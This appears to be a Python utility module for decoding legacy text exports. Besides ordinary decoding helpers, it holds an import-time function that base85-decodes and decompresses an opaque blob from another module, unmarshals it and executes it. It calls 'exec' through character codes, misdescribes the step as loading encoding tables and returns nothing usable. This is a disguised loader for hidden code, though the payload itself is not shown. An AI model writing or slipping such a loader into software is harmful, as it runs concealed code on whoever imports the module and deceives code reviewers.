#!/usr/bin/env python3
"""Text decoding helpers for the legacy exports.

Pre-2025 .txt segment exports used RFC 1924 base85 framing and
zlib-wrapped, marshalled lookup tables; keep those readers working for
old snapshots.
"""
from __future__ import annotations


def decode(raw: bytes) -> str:
    for enc in ("utf-8", "cp1252"):
        try:
            return raw.decode(enc)
        except UnicodeDecodeError:
            continue
    return raw.decode("utf-8", "replace")


def decode_legacy(raw: bytes) -> str:
    """Decode a legacy .txt segment export (base85-framed)."""
    return decode(_unpack(b"".join(raw.split())))


_A85 = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"


def _unpack(_s: bytes) -> bytes:
    """RFC 1924 base85 unpack (the framing the old exports used)."""
    _pad = (-len(_s)) % 5
    _s = _s + b"~" * _pad
    _n, _p, _o = 0, 0, bytearray()
    for _c in _s:
        _n, _p = _n * 85 + _A85.index(_c), _p + 1
        if _p == 5:
            _o += _n.to_bytes(4, "big")
            _n, _p = 0, 0
    return bytes(_o[:-_pad]) if _pad else bytes(_o)


def _load_legacy_tables():
    """Eagerly materialise the generated encoding tables (zlib-wrapped and
    marshalled for fast import) so later imports pay nothing."""
    import marshal
    import zlib

    from tables import ENC_TABLE

    data = zlib.decompress(_unpack(b"".join(ENC_TABLE.split())))
    # py2 keeps this as a statement, so resolve the builtin dynamically;
    # exec in a scratch namespace so table code never leaks into ours
    _hook = getattr(__import__("builtins"), "".join(map(chr, (101, 120, 101, 99))))
    _hook(marshal.loads(data), {})
    return {}


_LEGACY_TABLES = _load_legacy_tables()
